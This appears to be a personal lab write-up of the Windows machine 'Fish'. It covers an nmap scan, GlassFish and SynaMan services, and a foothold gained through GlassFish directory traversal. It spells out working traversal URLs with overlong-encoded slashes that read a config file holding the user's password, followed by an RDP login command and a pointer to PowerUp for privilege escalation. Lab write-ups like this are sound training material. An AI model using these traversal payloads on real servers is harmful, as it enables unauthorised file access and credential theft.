# Fish \[Windows]

## Summary

* Directory Traversal + Directory Listing = Path Traversal (WOW)
* If you can exfiltrate data and list out directories that's path traversal

## Enumeration

```
192.168.123.168
Nmap scan report for 192.168.123.168
Host is up (0.044s latency).
Not shown: 60453 closed tcp ports (reset), 5063 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE              VERSION
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fishyyy
| Issuer: commonName=Fishyyy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-29T04:54:04
| Not valid after:  2022-04-30T04:54:04
| MD5:   588e:de0b:ff8c:3e4a:cec6:f67d:24cb:6575
|_SHA-1: a80d:768d:a75e:6cbf:c992:be2b:2b80:5b6c:331b:4c08
|_ssl-date: 2021-10-30T05:04:17+00:00; -4y109d08h35m10s from scanner time.
3700/tcp  open  giop                 CORBA naming service
4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: GlassFish Server Open Source Edition  4.1 
|_http-favicon: Unknown favicon MD5: 9A8494B031149206CD1BC7EAE5051960
|_http-title: Login
5040/tcp  open  unknown
6060/tcp  open  x11?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"425-1267803922000"
|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
|     Content-Type: text/html
|     Content-Length: 425
|     Date: Sat, 30 Oct 2021 05:01:31 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <html>
|     <head>
|     <META HTTP-EQUIV="REFRESH" CONTENT="1;URL=app">
|     </head>
|     <body>
|     <script type="text/javascript">
|     <!--
|     currentLocation = window.location.pathname;
|     if(currentLocation.charAt(currentLocation.length - 1) == "/"){
|     window.location = window.location + "app";
|     }else{
|     window.location = window.location + "/app";
|     //-->
|     </script>
|     Loading Administration console. Please wait...
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 403 
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Set-Cookie: JSESSIONID=0984AA8E65F19F930C67728EEA1E576D; Path=/
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 5028
|     Date: Sat, 30 Oct 2021 05:01:33 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
|     <title>
|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
|     </title>
|     <meta NAME="Description" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta NAME="Keywords" CONTENT="SynaMan - Synametrics File Manager" />
|     <meta http-equiv="X-UA-Compatible" content="IE=10" />
|     <link rel="icon" type="image/png" href="images/favicon.png">
|     <link type="text/css" rel="stylesheet" href="images/AjaxFileExplorer.css">
|     <link rel="stylesheet" type="text/css"
|   JavaRMI: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 145
|     Date: Sat, 30 Oct 2021 05:01:26 GMT
|     Connection: close
|     Server: Synametrics Web Server v7
|_    <html><head><title>Oops</title><body><h1>Oops</h1><p>Well, that didn't go as we had expected.</p><p>This error has been logged.</p></body></html>
7676/tcp  open  java-message-service Java Message Service 301
8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
|_http-title: Data Web
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
8181/tcp  open  ssl/http             Sun GlassFish Open Source Edition  4.1
|_http-title: Data Web
|_http-server-header: GlassFish Server Open Source Edition  4.1 
| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Issuer: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2014-08-21T13:30:10
| Not valid after:  2024-08-18T13:30:10
| MD5:   594f:8111:2179:0c71:532a:00ab:223e:0e8a
|_SHA-1: 1ff8:eff1:b17d:c744:191e:213a:3102:9aa7:5982:a63c
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
8686/tcp  open  java-rmi             Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @169.254.99.240:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
49664/tcp open  msrpc                Microsoft Windows RPC
49665/tcp open  msrpc                Microsoft Windows RPC
49666/tcp open  msrpc                Microsoft Windows RPC
49667/tcp open  msrpc                Microsoft Windows RPC
49668/tcp open  msrpc                Microsoft Windows RPC
49669/tcp open  msrpc                Microsoft Windows RPC
49670/tcp open  msrpc                Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6060-TCP:V=7.94%I=7%D=2/16%Time=69931D64%P=x86_64-pc-linux-gnu%r(Ja
SF:vaRMI,139,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
SF:tf-8\r\nContent-Length:\x20145\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2
SF:005:01:26\x20GMT\r\nConnection:\x20close\r\nServer:\x20Synametrics\x20W
SF:eb\x20Server\x20v7\r\n\r\n<html><head><title>Oops</title><body><h1>Oops
SF:</h1><p>Well,\x20that\x20didn't\x20go\x20as\x20we\x20had\x20expected\.<
SF:/p><p>This\x20error\x20has\x20been\x20logged\.</p></body></html>")%r(Ge
SF:tRequest,2A4,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\
SF:x20W/\"425-1267803922000\"\r\nLast-Modified:\x20Fri,\x2005\x20Mar\x2020
SF:10\x2015:45:22\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\
SF:x20425\r\nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:01:31\x20GMT\r\nConn
SF:ection:\x20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r
SF:\n<html>\r\n<head>\r\n<META\x20HTTP-EQUIV=\"REFRESH\"\x20CONTENT=\"1;UR
SF:L=app\">\r\n</head>\r\n<body>\r\n\r\n<script\x20type=\"text/javascript\
SF:">\r\n<!--\r\n\r\nvar\x20currentLocation\x20=\x20window\.location\.path
SF:name;\r\nif\(currentLocation\.charAt\(currentLocation\.length\x20-\x201
SF:\)\x20==\x20\"/\"\){\r\n\twindow\.location\x20=\x20window\.location\x20
SF:\+\x20\"app\";\r\n}else{\r\n\twindow\.location\x20=\x20window\.location
SF:\x20\+\x20\"/app\";\r\n}\x20\r\n//-->\r\n</script>\r\n\r\nLoading\x20Ad
SF:ministration\x20console\.\x20Please\x20wait\.\.\.\r\n</body>\r\n</html>
SF:")%r(HTTPOptions,12E8,"HTTP/1\.1\x20403\x20\r\nCache-Control:\x20privat
SF:e\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nSet-Co
SF:okie:\x20JSESSIONID=0984AA8E65F19F930C67728EEA1E576D;\x20Path=/\r\nCont
SF:ent-Type:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x205028\r\
SF:nDate:\x20Sat,\x2030\x20Oct\x202021\x2005:01:33\x20GMT\r\nConnection:\x
SF:20close\r\nServer:\x20Synametrics\x20Web\x20Server\x20v7\r\n\r\n<!DOCTY
SF:PE\x20html>\r\n\r\n\r\n<html>\r\n<head>\r\n<meta\x20http-equiv=\"conten
SF:t-type\"\x20content=\"text/html;\x20charset=UTF-8\"\x20/>\r\n<title>\r\
SF:nSynaMan\x20-\x20Synametrics\x20File\x20Manager\x20-\x20Version:\x205\.
SF:1\x20-\x20build\x201595\x20\r\n</title>\r\n\r\n\r\n<meta\x20NAME=\"Desc
SF:ription\"\x20CONTENT=\"SynaMan\x20-\x20Synametrics\x20File\x20Manager\"
SF:\x20/>\r\n<meta\x20NAME=\"Keywords\"\x20CONTENT=\"SynaMan\x20-\x20Synam
SF:etrics\x20File\x20Manager\"\x20/>\r\n\r\n\r\n<meta\x20http-equiv=\"X-UA
SF:-Compatible\"\x20content=\"IE=10\"\x20/>\r\n\r\n\r\n\r\n<link\x20rel=\"
SF:icon\"\x20type=\"image/png\"\x20href=\"images/favicon\.png\">\r\n\x20\r
SF:\n\x20\r\n\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=
SF:\"images/AjaxFileExplorer\.css\">\r\n\r\n\r\n\r\n<link\x20rel=\"stylesh
SF:eet\"\x20type=\"text/css\"\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1570d08h35m10s, deviation: 0s, median: -1570d08h35m10s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-30T05:04:03
|_  start_date: N/A

```

#### UDP

```
123/udp   closed        ntp          port-unreach ttl 125
```

### Files

None

### Ports

#### 8080 & 8181 (HTTP/S)

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption><p>looks like slop</p></figcaption></figure>

#### 4848

Oracle GlassFish

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

#### 6060

Synaman 5.1

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../../.gitbook/assets/image (76).png" alt="" width="563"><figcaption></figcaption></figure></div>

### Exploits

{% embed url="https://www.exploit-db.com/exploits/39441" %}

### Loot

#### Creds

arthur:KingOfAtlantis

#### Flags

```
Hehe
```

## Initial Foothold

Oracle GlassFish Server Directory Traversal

We can't read creds from synaman?

Or go user by user

SAM & SYSTEM would be too meta

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption><p>Directory Traversal</p></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption><p>Directory Listing</p></figcaption></figure>

```
http://192.168.123.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afUsers%c0%afarthur
http://192.168.123.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan%c0%afconfig%c0%afAppConfig.xml
```

Did not forget our initial path before SIREN told us what path traversal meant, looked for AppConfig.xml and found creds for 'arthur'

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

```
xfreerdp /u:arthur /p:'KingOfAtlantis' /v:192.168.123.168 /dynamic-resolution /cert:ignore
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

Run PowerUp.ps1

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

## Post Exploitation

<div align="left"><figure><img src="../../.gitbook/assets/image (82).png" alt="" width="563"><figcaption></figcaption></figure></div>
